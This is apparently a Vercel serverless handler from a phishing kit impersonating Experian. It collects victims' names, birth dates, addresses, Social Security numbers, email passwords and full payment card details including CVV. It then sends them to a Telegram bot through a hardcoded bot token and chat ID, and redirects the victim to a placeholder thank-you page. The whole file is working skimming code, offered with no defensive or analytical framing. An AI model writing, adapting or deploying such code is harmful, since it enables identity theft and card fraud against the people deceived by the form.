// api/submit.js
import fetch from 'node-fetch';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      // Parse form data (Vercel auto-parses URL-encoded form bodies)
      const {
        first_name,
        last_name,
        dob,
        phone_country,
        phone,
        street_address,
        apt_unit,
        zip_code,
        city,
        state,
        ssn,
        email,
        password,
        reason,
        card_number,
        card_expiry_month,
        card_expiry_year,
        card_cvv,
        card_holder_name
      } = req.body;

      const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
      const chatId = '7587120060';

      // Build message
      const message = `
⚠️ *New Experian Form Submission* ⚠️

*Personal Info:*
Name: ${first_name} ${last_name}
DOB: ${dob}
Phone: ${phone_country} ${phone}
Address: ${street_address}, ${apt_unit || 'N/A'}, ${city}, ${state} ${zip_code}
SSN: ${ssn}
Email: ${email}
Reason: ${reason}

*Card Info:*
Card #: ${card_number}
Expiry: ${card_expiry_month}/${card_expiry_year}
CVV: ${card_cvv}
Name on Card: ${card_holder_name}
      `.trim();

      const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown' // Optional: for formatting
        })
      });

      const result = await response.json();
      console.log('Telegram response:', result);

      if (!response.ok) {
        throw new Error(result.description || 'Unknown Telegram error');
      }

      // ✅ REDIRECT USER TO YOUR THANK-YOU PAGE
      const redirectUrl = 'https://your-redirect-website.com/thank-you'; // ← CHANGE THIS!
      res.writeHead(302, { Location: redirectUrl });
      res.end();

    } catch (error) {
      console.error('Error:', error);
      // Redirect to error page or show message
      res.status(500).send('Submission failed. Please try again.');
    }
  } else {
    res.status(405).send('Method not allowed');
  }
}
